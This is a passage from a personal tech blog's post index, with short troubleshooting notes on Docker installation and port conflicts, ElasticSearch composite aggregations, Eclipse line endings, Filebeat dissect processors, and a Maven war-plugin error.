class="line">(try to add <span class="string">&#x27;--allowerasing&#x27;</span> to <span class="built_in">command</span> line to replace conflicting packages or <span class="string">&#x27;--skip-broken&#x27;</span> to skip uninstallable packages or <span class="string">&#x27;--nobest&#x27;</span> to use not only best candidate packages)</span><br><span class="line"></span><br><span class="line">Solve:</span><br><span class="line">$ yum install docker-ce docker-ce-cli containerd.io --allowerasing</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Docker</tag>
        <tag>Rocky8</tag>
        <tag>Containerd</tag>
      </tags>
  </entry>
  <entry>
    <title>ElasticSearch Composite Aggregation</title>
    <url>/posts/9944da03/</url>
    <content><![CDATA[<h3 id="Intro-ElasticSearch-Composite-Aggregation"><a href="#Intro-ElasticSearch-Composite-Aggregation" class="headerlink" title="Intro ElasticSearch Composite Aggregation"></a>Intro ElasticSearch Composite Aggregation</h3><span id="more"></span>
<p>這篇介紹ElasticSearch Composite Aggregation。</p>
<h3 id="KQL"><a href="#KQL" class="headerlink" title="KQL"></a>KQL</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;aggs&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;my_buckets&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;composite&quot;</span> : &#123;</span><br><span class="line">                 <span class="string">&quot;sources&quot;</span> : [</span><br><span class="line">                    &#123; <span class="string">&quot;product&quot;</span>: &#123; <span class="string">&quot;terms&quot;</span>: &#123;<span class="string">&quot;field&quot;</span>: <span class="string">&quot;product&quot;</span> &#125; &#125; &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;aggregations&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;price&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;sum&quot;</span>: &#123; <span class="string">&quot;field&quot;</span>: <span class="string">&quot;price&quot;</span> &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span>:</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&quot;aggregations&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;my_buckets&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;after_key&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;product&quot;</span>: <span class="string">&quot;rocky&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;buckets&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;key&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;product&quot;</span>: <span class="string">&quot;apocalypse now&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;doc_count&quot;</span>: 1,</span><br><span class="line">                    <span class="string">&quot;price&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;value&quot;</span>: 10.0</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;key&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;product&quot;</span>: <span class="string">&quot;mad max&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;doc_count&quot;</span>: 1,</span><br><span class="line">                    <span class="string">&quot;price&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;value&quot;</span>: 27.0</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;key&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;product&quot;</span> : <span class="string">&quot;mad max&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;doc_count&quot;</span>: 2,</span><br><span class="line">                    <span class="string">&quot;price&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;value&quot;</span>: 22.5</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;key&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;product&quot;</span>: <span class="string">&quot;rocky&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;doc_count&quot;</span>: 1,</span><br><span class="line">                    <span class="string">&quot;price&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;value&quot;</span>: 10.0</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RestHighLevelApi-Example"><a href="#RestHighLevelApi-Example" class="headerlink" title="RestHighLevelApi Example"></a>RestHighLevelApi Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();</span><br><span class="line">List&lt;CompositeValuesSourceBuilder&lt;?&gt;&gt; sources = new ArrayList&lt;&gt;();</span><br><span class="line">sources.add(new TermsValuesSourceBuilder(<span class="string">&quot;product&quot;</span>).field(<span class="string">&quot;product&quot;</span>).missingBucket(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">CompositeAggregationBuilder composite = new CompositeAggregationBuilder(<span class="string">&quot;my_bucket&quot;</span>, sources);</span><br><span class="line">composite.size(10000);</span><br><span class="line">composite.subAggregation(AggregationBuilders.<span class="built_in">sum</span>(<span class="string">&quot;price&quot;</span>).field(<span class="string">&quot;price&quot;</span>));</span><br><span class="line">sourceBuilder.aggregation(composite);</span><br><span class="line">sourceBuilder.size(0);</span><br><span class="line"></span><br><span class="line">SearchResponse searchResponse = ELKManager.search(sourceBuilder);</span><br><span class="line"></span><br><span class="line">CompositeAggregation compositeAggregation = searchResponse.getAggregations().get(<span class="string">&quot;my_bucket&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (compositeAggregation.getBuckets().size() &gt; 0) &#123;</span><br><span class="line">	<span class="keyword">for</span> (CompositeAggregation.Bucket bucket : compositeAggregation.getBuckets()) &#123;</span><br><span class="line">		Map&lt;String, Object&gt; resultKey = bucket.getKey();</span><br><span class="line">		Aggregations sumReward = bucket.getAggregations();</span><br><span class="line">		Sum <span class="built_in">sum</span> = sumReward.get(<span class="string">&quot;price&quot;</span>);</span><br><span class="line">		System.out.println((String) resultKey.get(&quot;product&quot;) + &quot; ; &quot; + BigDecimal.valueOf(sum.getValue()));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>Eclipse - Set LineBreak For Unix</title>
    <url>/posts/97263af2/</url>
    <content><![CDATA[<h3 id="Eclipse-Set-LineBreak-For-Unix"><a href="#Eclipse-Set-LineBreak-For-Unix" class="headerlink" title="Eclipse - Set LineBreak For Unix"></a>Eclipse - Set LineBreak For Unix</h3><span id="more"></span>
<p>這篇簡介在Eclipse設定Unix的換行規則。</p>
<h3 id="在-Windows-gt-Preference-gt-General-gt-workspace"><a href="#在-Windows-gt-Preference-gt-General-gt-workspace" class="headerlink" title="在 Windows -&gt; Preference -&gt; General -&gt; workspace:"></a>在 Windows -&gt; Preference -&gt; General -&gt; workspace:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在New text file line delimiter下選取Other -&gt; Unix。</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/Eclipse1.png" width="50%" />

<h3 id="接著Windows-gt-Preference-gt-General-gt-Editors-gt-Text-Editors"><a href="#接著Windows-gt-Preference-gt-General-gt-Editors-gt-Text-Editors" class="headerlink" title="接著Windows -&gt; Preference -&gt; General -&gt; Editors -&gt; Text Editors:"></a>接著Windows -&gt; Preference -&gt; General -&gt; Editors -&gt; Text Editors:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">勾選Show whitespace characters CheckBox</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/Eclipse2.png" width="50%" />]]></content>
      <categories>
        <category>Eclipse</category>
      </categories>
      <tags>
        <tag>LineBreak</tag>
      </tags>
  </entry>
  <entry>
    <title>FilebeatDissect</title>
    <url>/posts/6a7650e3/</url>
    <content><![CDATA[<h3 id="Filebeat-Dissect"><a href="#Filebeat-Dissect" class="headerlink" title="Filebeat Dissect"></a>Filebeat Dissect</h3><span id="more"></span>
<p>1.One of the Processors used by Filebeat to cut logs<br>2.Dissect mainly cuts out the key through% {key_name}, and the corresponding content is<br>the value of this key<br>3.Tips for cutting the log: do not need to cut the text or special characters in the log, please<br>write it into the dissect processor</p>
<h3 id="The-following-demonstrates-a-log-dissect-processor"><a href="#The-following-demonstrates-a-log-dissect-processor" class="headerlink" title="The following demonstrates a log dissect processor"></a>The following demonstrates a log dissect processor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Log:</span><br><span class="line">[2020/02/11 10:00:00.175][BaseService.java:2566][ERROR][http-nio-1213-exec-306] [Status]:&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;1028&quot;</span>&#125;,</span><br><span class="line">[Agent_ID]:002,[Request]:&#123;<span class="string">&quot;Method&quot;</span>:<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;IP&quot;</span>:<span class="string">&quot;10.10.80.2&quot;</span>&#125;,[Response]:&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;1028&quot;</span>&#125;</span><br><span class="line">Dissect processor:</span><br><span class="line">[%&#123;logdate&#125;][%&#123;class&#125;][%&#123;severity&#125;][%&#123;thread&#125;]</span><br><span class="line">[Status]:%&#123;status&#125;,[Agent_ID]:%&#123;agentId&#125;,[Request]:%&#123;request&#125;,[Response]:%&#123;response&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Debugging-procedure"><a href="#Debugging-procedure" class="headerlink" title="Debugging procedure"></a>Debugging procedure</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">First comment out the drop event of <span class="built_in">test</span> pipeline yml</span><br><span class="line">---------------------------------------</span><br><span class="line">- <span class="built_in">type</span>: <span class="built_in">log</span></span><br><span class="line"> paths:</span><br><span class="line"> - <span class="string">&quot;<span class="variable">$&#123;PWD&#125;</span>/sampleLogs/FullRecord.log&quot;</span></span><br><span class="line"> fields_under_root: <span class="literal">true</span></span><br><span class="line"> scan_frequency: 3s</span><br><span class="line"> idle_timeout: 3s</span><br><span class="line"> pipeline: fullrecordapi</span><br><span class="line"> ignore_older: 2h</span><br><span class="line"> close_inactive: 1h</span><br><span class="line"> clean_inactive: 3h</span><br><span class="line"> close_removed: <span class="literal">true</span></span><br><span class="line"> clean_removed: <span class="literal">true</span></span><br><span class="line"> processors:</span><br><span class="line"> - dissect:</span><br><span class="line"> tokenizer: <span class="string">&quot;[%&#123;logdate&#125;][%&#123;class&#125;][%&#123;severity&#125;][%&#123;thread&#125;]</span></span><br><span class="line"><span class="string">[Status]:%&#123;Status&#125;,[Agent_ID]:%&#123;Agent_ID&#125;,[Request]:%&#123;Request&#125;,[Response]:%&#123;Response&#125;&quot;</span></span><br><span class="line"> field: <span class="string">&quot;message&quot;</span></span><br><span class="line"> target_prefix: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># - drop_event:</span></span><br><span class="line"><span class="comment"># when:</span></span><br><span class="line"><span class="comment"># has_fields: [&quot;log.flags&quot;]</span></span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure>

<h3 id="Secondly-rewrite-the-path-in-test-yml-to-the-pipeline-yml-path-to-be-tested"><a href="#Secondly-rewrite-the-path-in-test-yml-to-the-pipeline-yml-path-to-be-tested" class="headerlink" title="Secondly, rewrite the path in test.yml to the pipeline yml path to be tested"></a>Secondly, rewrite the path in test.yml to the pipeline yml path to be tested</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">filebeat.config.inputs:</span><br><span class="line"> enabled: <span class="literal">true</span></span><br><span class="line"> path: /home/elk/filebeat/CustomConfig/inputs.d/test.yml</span><br><span class="line">output.console:</span><br><span class="line"> pretty: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="Finally-use-command-x2F-filebeat-c-CustomConfig-x2F-test-yml-to-see-debug-message"><a href="#Finally-use-command-x2F-filebeat-c-CustomConfig-x2F-test-yml-to-see-debug-message" class="headerlink" title="Finally use command .&#x2F;filebeat -c CustomConfig&#x2F;test.yml to see debug message"></a>Finally use command .&#x2F;filebeat -c CustomConfig&#x2F;test.yml to see debug message</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> you see the message like following. it is mean your dissect not success <span class="built_in">cut</span> <span class="built_in">log</span></span><br><span class="line">---------------------------------------</span><br><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;@timestamp&quot;</span>: <span class="string">&quot;2020-04-10T12:28:54.081Z&quot;</span>,</span><br><span class="line"> <span class="string">&quot;@metadata&quot;</span>: &#123;</span><br><span class="line"> <span class="string">&quot;beat&quot;</span>: <span class="string">&quot;filebeat&quot;</span>,</span><br><span class="line"> <span class="string">&quot;type&quot;</span>: <span class="string">&quot;_doc&quot;</span>,</span><br><span class="line"> <span class="string">&quot;version&quot;</span>: <span class="string">&quot;7.3.2&quot;</span>,</span><br><span class="line"> <span class="string">&quot;pipeline&quot;</span>: <span class="string">&quot;ckf_manager&quot;</span></span><br><span class="line"> &#125;,</span><br><span class="line"> <span class="string">&quot;ecs&quot;</span>: &#123;</span><br><span class="line"> <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.1&quot;</span></span><br><span class="line"> &#125;,</span><br><span class="line"> <span class="string">&quot;message&quot;</span>: <span class="string">&quot;kqpowkepowqkepoqkwepo12po21po,qwpd[2019/12/13 23:22:20.969][Match</span></span><br><span class="line"><span class="string">BO.java.closeToSettled:693][INFO][QuartzScheduler_Worker-17] [Function]:Change Match St</span></span><br><span class="line"><span class="string">atus-Settle Match(Match ID=865445),[Action]:Edit,[Website]:null,[Previous Value]:96,[Curren</span></span><br><span class="line"><span class="string">t Value]:288,[Update By]:System&quot;</span>,</span><br><span class="line"> <span class="string">&quot;log&quot;</span>: &#123;</span><br><span class="line"> <span class="string">&quot;offset&quot;</span>: 0,</span><br><span class="line"> <span class="string">&quot;file&quot;</span>: &#123;</span><br><span class="line"> <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/var/data/log/ckf_manager/2.log&quot;</span></span><br><span class="line"> &#125;,</span><br><span class="line"> <span class="string">&quot;flags&quot;</span>: [</span><br><span class="line"> <span class="string">&quot;dissect_parsing_error&quot;</span></span><br><span class="line"> ]</span><br><span class="line"> &#125;,</span><br><span class="line"> <span class="string">&quot;input&quot;</span>: &#123;</span><br><span class="line"> <span class="string">&quot;type&quot;</span>: <span class="string">&quot;log&quot;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<h3 id="Version-control"><a href="#Version-control" class="headerlink" title="Version control"></a>Version control</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">In order to enhance the synchronization of the Filebeat settings of each project and the</span><br><span class="line">Elasticsearch pipeline of the ITIG team. In the future, Filebeat will add the version number</span><br><span class="line">---------------------------------------</span><br><span class="line">- <span class="built_in">type</span>: <span class="built_in">log</span></span><br><span class="line"> paths:</span><br><span class="line"> - <span class="string">&quot;<span class="variable">$&#123;PWD&#125;</span>/sampleLogs/FullRecord.log&quot;</span></span><br><span class="line"> fields:</span><br><span class="line"> version: <span class="string">&quot;1.0&quot;</span></span><br><span class="line"> fields_under_root: <span class="literal">true</span></span><br><span class="line"> scan_frequency: 3s</span><br><span class="line"> idle_timeout: 3s</span><br><span class="line"> pipeline: fullrecordapi</span><br><span class="line"> ignore_older: 2h</span><br><span class="line"> close_inactive: 1h</span><br><span class="line"> clean_inactive: 3h</span><br><span class="line"> close_removed: <span class="literal">true</span></span><br><span class="line"> clean_removed: <span class="literal">true</span></span><br><span class="line"> processors:</span><br><span class="line"> - dissect:</span><br><span class="line"> tokenizer: <span class="string">&quot;[%&#123;logdate&#125;][%&#123;class&#125;][%&#123;severity&#125;][%&#123;thread&#125;]</span></span><br><span class="line"><span class="string">[Status]:%&#123;Status&#125;,[Agent_ID]:%&#123;Agent_ID&#125;,[Request]:%&#123;Request&#125;,[Response]:%&#123;Response&#125;&quot;</span></span><br><span class="line"> field: <span class="string">&quot;message&quot;</span></span><br><span class="line"> target_prefix: <span class="string">&quot;&quot;</span></span><br><span class="line"> - drop_event:</span><br><span class="line">---------------------------------------</span><br><span class="line">If each project needs to modify the filebeat config. Please be sure to inform the ITIG team to</span><br><span class="line">modify the version number to avoid the <span class="built_in">log</span> from failing to parse</span><br></pre></td></tr></table></figure>

<h3 id="Notice"><a href="#Notice" class="headerlink" title="Notice:"></a>Notice:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1. Any spaces or special characters will affect whether the <span class="built_in">log</span> can be <span class="built_in">cut</span> correctly, please make sure the <span class="built_in">log</span> format is unified</span><br><span class="line">2. Please use the lower camel <span class="keyword">case</span> to name the key</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Filebeat</category>
      </categories>
      <tags>
        <tag>Dissect</tag>
      </tags>
  </entry>
  <entry>
    <title>Error Injecting Org Apache Maven Plugin War WarMojo</title>
    <url>/posts/15d0a37f/</url>
    <content><![CDATA[<h3 id="Intro-Error-Injecting-Org-Apache-Maven-Plugin-War-WarMojo"><a href="#Intro-Error-Injecting-Org-Apache-Maven-Plugin-War-WarMojo" class="headerlink" title="Intro Error Injecting Org Apache Maven Plugin War WarMojo"></a>Intro Error Injecting Org Apache Maven Plugin War WarMojo</h3><span id="more"></span>
<p>這篇介紹How to solve Error Injecting Org Apache Maven Plugin War WarMojo。</p>
<h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[INFO] --- maven-war-plugin:2.2:war (default-war) @ projectName ---</span><br><span class="line">[WARNING] Error injecting: org.apache.maven.plugin.war.WarMojo</span><br><span class="line">com.google.inject.ProvisionException: Unable to provision, see the following errors:</span><br><span class="line"></span><br><span class="line">1) Error injecting constructor, java.lang.ExceptionInInitializerError: Cannot access defaults field of Properties</span><br><span class="line">  at org.apache.maven.plugin.war.WarMojo.&lt;init&gt;(Unknown Source)</span><br><span class="line">  <span class="keyword">while</span> locating org.apache.maven.plugin.war.WarMojo</span><br><span class="line"></span><br><span class="line">1 error</span><br><span class="line">	at com.google.inject.internal.InternalProvisionException.toProvisionException(InternalProvisionException.java:226)</span><br><span class="line">	at com.google.inject.internal.InjectorImpl<span class="variable">$1</span>.get(InjectorImpl.java:1053)</span><br><span class="line">	at com.google.inject.internal.InjectorImpl.getInstance(InjectorImpl.java:1086)</span><br><span class="line">	at org.eclipse.sisu.space.AbstractDeferredClass.get(AbstractDeferredClass.java:48)</span><br><span class="line">	at com.google.inject.internal.ProviderInternalFactory.provision(ProviderInternalFactory.java:85)</span><br><span class="line">	at com.google.inject.internal.InternalFactoryToInitializableAdapter.provision(InternalFactoryToInitializableAdapter.java:57)</span><br><span class="line">	at com.google.inject.internal.ProviderInternalFactory<span class="variable">$1</span>.call(ProviderInternalFactory.java:66)</span><br><span class="line">	at com.google.inject.internal.ProvisionListenerStackCallback<span class="variable">$Provision</span>.provision(ProvisionListenerStackCallback.java:112)</span><br><span class="line">	at com.google.inject.internal.ProvisionListenerStackCallback<span class="variable">$Provision</span>.provision(ProvisionListenerStackCallback.java:127)</span><br><span class="line">	at com.google.inject.internal.ProvisionListenerStackCallback.provision(ProvisionListenerStackCallback.java:66)</span><br><span class="line">	at com.google.inject.internal.ProviderInternalFactory.circularGet(ProviderInternalFactory.java:61)</span><br><span class="line">	at com.google.inject.internal.InternalFactoryToInitializableAdapter.get(InternalFactoryToInitializableAdapter.java:47)</span><br><span class="line">	at com.google.inject.internal.InjectorImpl<span class="variable">$1</span>.get(InjectorImpl.java:1050)</span><br><span class="line">	at org.eclipse.sisu.inject.Guice4<span class="variable">$1</span>.get(Guice4.java:162)</span><br><span class="line">	at org.eclipse.sisu.inject.LazyBeanEntry.getValue(LazyBeanEntry.java:81)</span><br><span class="line">	at org.eclipse.sisu.plexus.LazyPlexusBean.getValue(LazyPlexusBean.java:51)</span><br><span class="line">	at org.codehaus.plexus.DefaultPlexusContainer.lookup(DefaultPlexusContainer.java:263)</span><br><span class="line">	at org.codehaus.plexus.DefaultPlexusContainer.lookup(DefaultPlexusContainer.java:255)</span><br><span class="line">	at org.apache.maven.plugin.internal.DefaultMavenPluginManager.getConfiguredMojo(DefaultMavenPluginManager.java:520)</span><br><span class="line">	at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:124)</span><br><span class="line">	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:210)</span><br><span class="line">	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:156)</span><br><span class="line">	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:148)</span><br><span class="line">	at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:117)</span><br><span class="line">	at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:81)</span><br><span class="line">	at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build(SingleThreadedBuilder.java:56)</span><br><span class="line">	at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:128)</span><br><span class="line">	at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:305)</span><br><span class="line">	at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:192)</span><br><span class="line">	at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:105)</span><br><span class="line">	at org.apache.maven.cli.MavenCli.execute(MavenCli.java:957)</span><br><span class="line">	at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:289)</span><br><span class="line">	at org.apache.maven.cli.MavenCli.main(MavenCli.java:193)</span><br><span class="line">	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)</span><br><span class="line">	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">	at java.base/java.lang.reflect.Method.invoke(Method.java:568)</span><br><span class="line">	at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:282)</span><br><span class="line">	at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:225)</span><br><span class="line">	at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:406)</span><br><span class="line">	at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:347)</span><br><span class="line">Caused by: java.lang.ExceptionInInitializerError: Cannot access defaults field of Properties</span><br><span class="line">	at com.thoughtworks.xstream.converters.collections.PropertiesConverter.&lt;clinit&gt;(PropertiesConverter.java:46)</span><br><span class="line">	at com.thoughtworks.xstream.XStream.setupConverters(XStream.java:647)</span><br><span class="line">	at com.thoughtworks.xstream.XStream.&lt;init&gt;(XStream.java:445)</span><br><span class="line">	at com.thoughtworks.xstream.XStream.&lt;init&gt;(XStream.java:385)</span><br><span class="line">	at com.thoughtworks.xstream.XStream.&lt;init&gt;(XStream.java:342)</span><br><span class="line">	at org.apache.maven.plugin.war.util.WebappStructureSerializer.&lt;clinit&gt;(WebappStructureSerializer.java:47)</span><br><span class="line">	at org.apache.maven.plugin.war.AbstractWarMojo.&lt;init&gt;(AbstractWarMojo.java:316)</span><br><span class="line">	at org.apache.maven.plugin.war.WarMojo.&lt;init&gt;(WarMojo.java:49)</span><br><span class="line">	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)</span><br><span class="line">	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:77)</span><br><span class="line">	at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class="line">	at java.base/java.lang.reflect.Constructor.newInstanceWithCaller(Constructor.java:499)</span><br><span class="line">	at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:480)</span><br><span class="line">	at com.google.inject.internal.DefaultConstructionProxyFactory<span class="variable">$ReflectiveProxy</span>.newInstance(DefaultConstructionProxyFactory.java:126)</span><br><span class="line">	at com.google.inject.internal.ConstructorInjector.provision(ConstructorInjector.java:114)</span><br><span class="line">	at com.google.inject.internal.ConstructorInjector.access<span class="variable">$000</span>(ConstructorInjector.java:32)</span><br><span class="line">	at com.google.inject.internal.ConstructorInjector<span class="variable">$1</span>.call(ConstructorInjector.java:98)</span><br><span class="line">	at com.google.inject.internal.ProvisionListenerStackCallback<span class="variable">$Provision</span>.provision(ProvisionListenerStackCallback.java:112)</span><br><span class="line">	at com.google.inject.internal.ProvisionListenerStackCallback<span class="variable">$Provision</span>.provision(ProvisionListenerStackCallback.java:127)</span><br><span class="line">	at com.google.inject.internal.ProvisionListenerStackCallback.provision(ProvisionListenerStackCallback.java:66)</span><br><span class="line">	at com.google.inject.internal.ConstructorInjector.construct(ConstructorInjector.java:93)</span><br><span class="line">	at com.google.inject.internal.ConstructorBindingImpl<span class="variable">$Factory</span>.get(ConstructorBindingImpl.java:306)</span><br><span class="line">	at com.google.inject.internal.InjectorImpl<span class="variable">$1</span>.get(InjectorImpl.java:1050)</span><br><span class="line">	... 39 more</span><br></pre></td></tr></table></figure>

<h3 id="add-plugin"><a href="#add-plugin" class="headerlink" title="add plugin"></a>add plugin</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.2.2&lt;/version&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br><span class="line"></span><br><span class="line">pom.xml加上以上plugin即可解決</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Maven</category>
      </categories>
      <tags>
        <tag>Maven</tag>
        <tag>Apache</tag>
        <tag>War</tag>
      </tags>
  </entry>
  <entry>
    <title>Error Starting Userland Proxy Listen Tcp4 Bind Address Already In Use</title>
    <url>/posts/2df76b3b/</url>
    <content><![CDATA[<h3 id="Error-Starting-Userland-Proxy-Listen-Tcp4-Bind-Address-Already-In-Use"><a href="#Error-Starting-Userland-Proxy-Listen-Tcp4-Bind-Address-Already-In-Use" class="headerlink" title="Error Starting Userland Proxy Listen Tcp4 Bind Address Already In Use"></a>Error Starting Userland Proxy Listen Tcp4 Bind Address Already In Use</h3><span id="more"></span>
<p>這篇介紹Error Starting Userland Proxy Listen Tcp4 Bind Address Already In Use。</p>
<h3 id="發生過程"><a href="#發生過程" class="headerlink" title="發生過程"></a>發生過程</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在啟動Docker時出現以下訊息</span><br><span class="line"></span><br><span class="line">[+] Running 0/1</span><br><span class="line"> ⠿ Container tomcat  Starting</span><br><span class="line">Error response from daemon: driver failed programming external connectivity on endpoint</span><br><span class="line">tomcat (dabeea52a106738fd0d161befde382a478035d40ad359c7cc723abfd591f7b69): Error starting</span><br><span class="line">userland proxy: listen tcp4 0.0.0.0:47100: <span class="built_in">bind</span>: address already <span class="keyword">in</span> use</span><br><span class="line"></span><br><span class="line">代表47100這個port已被process佔用</span><br><span class="line">可以用指令</span><br><span class="line">$ netstat -nlp</span><br><span class="line">來查看是哪一個port被哪支process佔用</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title>FileBeat造成ERROR常見問題</title>
    <url>/posts/e1978c08/</url>
    <content><![CDATA[<h3 id="FileBeat造成ERROR常見問題"><a href="#FileBeat造成ERROR常見問題" class="headerlink" title="FileBeat造成ERROR常見問題"></a>FileBeat造成ERROR常見問題</h3><span id="more"></span>
<p>這篇介紹FileBeat造成ERROR常見問題。</p>
<h3 id="Filebeat-ERROR"><a href="#Filebeat-ERROR" class="headerlink" title="Filebeat ERROR"></a>Filebeat ERROR</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在/logs/filebeat 會出現 ERROR 字樣，看不出來是什麼原因造成錯誤。</span><br><span class="line">1. 硬碟滿了，造成寫Log只寫到一半，parse 資料錯誤。</span><br><span class="line">2. <span class="built_in">log</span>的資料與yml設定的欄位格式不一致，無法mapping</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1. 做Server硬碟空間告警，超過80%即通知相關人員</span><br><span class="line">2. 有用到filebeat推資料的<span class="built_in">log</span>，需要統一控管格式</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Filebeat</category>
      </categories>
      <tags>
